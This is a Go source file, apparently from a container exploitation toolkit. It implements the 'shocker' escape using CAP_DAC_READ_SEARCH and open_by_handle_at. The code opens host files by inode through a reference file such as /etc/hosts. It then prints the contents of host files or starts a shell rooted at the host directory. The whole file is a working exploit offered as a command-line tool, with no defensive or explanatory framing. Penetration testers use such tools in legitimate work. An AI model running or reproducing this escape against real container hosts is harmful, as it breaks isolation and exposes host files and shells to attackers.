package shocker

import (
	_ "embed"
	"encoding/binary"
	"fmt"
	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/urfave/cli/v2"
	"golang.org/x/sys/unix"
	"io"
	"os"
	"os/exec"
	"syscall"
)

type Vulnerability struct {
	vul.BaseVulnerability
}

var Shocker = Vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "shocker",
		Description: "Container escape with CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014.",
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.InContainer,
			Check:   exeenv.InContainer,
			Exploit: exeenv.InContainer,
		},
		CheckSecPrerequisites: prerequisite.Prerequisites{
			&capability.CapDacReadSearchBnd,
		},
		ExploitablePrerequisites: prerequisite.Prerequisites{
			&capability.CapDacReadSearchEff,
		},
	},
}

var Exploit = app.Vul2ExploitCmd(
	&Shocker,
	[]string{"cap_dac_read_search", "open_by_handle_at"},
	[]cli.Flag{
		&cli.IntFlag{
			Name:        "inode",
			DefaultText: "default is 2, (in ext fs, root's inode is 2)",
			Required:    false,
			Value:       2,
		},
		&cli.StringFlag{
			Name:        "reference",
			Aliases:     []string{"r", "ref", "mountFd"},
			DefaultText: "default is /etc/hosts",
			Required:    false,
			Value:       "/etc/hosts",
		},
	},
	true,
)

func (v Vulnerability) GetFd(inode int, ref string) (fd int, err error) {
	hostReference, err := syscall.Open(ref, syscall.O_RDONLY, 0)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	defer syscall.Close(hostReference)
	inodeBytes := make([]byte, 8)
	// 将 inode 转换为小端序的字节数组
	binary.LittleEndian.PutUint64(inodeBytes, uint64(inode))
	handle := unix.NewFileHandle(1, inodeBytes)
	fd, err = unix.OpenByHandleAt(hostReference, handle, unix.O_RDONLY)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return
}

func (v Vulnerability) Chroot(rootFd int) (err error) {
	shell := "/bin/sh"
	cmd := exec.Command(shell)
	cmd.Dir = fmt.Sprintf("/proc/self/fd/%d", rootFd)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	awesome_error.CheckFatal(cmd.Start())
	cmd.Wait()
	return
}

func (v Vulnerability) Exploit(context *cli.Context) (err error) {
	err = v.BaseVulnerability.Exploit(context)
	if err != nil {
		return
	}
	inode := context.Int("inode")
	ref := context.String("ref")
	fd, err := v.GetFd(inode, ref)
	if err != nil {
		return
	}
	f := os.NewFile(uintptr(fd), fmt.Sprintf("/proc/self/fd/%d", fd))
	fi, err := f.Stat()
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	if fi.IsDir() {
		err = v.Chroot(fd)
		if err != nil {
			return
		}
	} else {
		fmt.Printf("stat: %+v\n", fi)
		content, e := io.ReadAll(f)
		if e != nil {
			err = e
			awesome_error.CheckErr(err)
			return
		}
		fmt.Println(string(content))
	}
	return
}
